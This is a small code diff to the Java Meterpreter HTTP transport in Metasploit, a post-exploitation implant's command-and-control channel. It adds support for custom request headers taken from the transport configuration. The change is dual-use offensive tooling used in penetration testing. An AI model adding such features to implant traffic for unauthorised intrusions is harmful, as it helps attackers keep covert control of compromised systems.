@@ -2,6 +2,7 @@ package com.metasploit.meterpreter;
 
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.stage.ConfigParser;
+import com.metasploit.stage.HttpConnection;
 import com.metasploit.stage.PayloadTrustManager;
 import com.metasploit.stage.TransportConfig;
 
@@ -22,6 +23,7 @@ public class HttpTransport extends Transport {
     private String proxy;
     private String proxyUser;
     private String proxyPass;
+    private String customHeaders;
     private byte[] certHash;
 
     public HttpTransport(Meterpreter met, String url) throws MalformedURLException {
@@ -36,6 +38,7 @@ public class HttpTransport extends Transport {
         proxyUser = transportConfig.proxy_user;
         proxyPass = transportConfig.proxy_pass;
         certHash = transportConfig.cert_hash;
+        customHeaders = transportConfig.custom_headers;
         setTimeouts(transportConfig);
     }
 
@@ -240,6 +243,7 @@ public class HttpTransport extends Transport {
 
         try {
             conn = this.targetUrl.openConnection();
+            HttpConnection.addRequestHeaders(conn, userAgent, customHeaders);
 
             if (this.targetUrl.getProtocol().equals("https")) {
                 try {
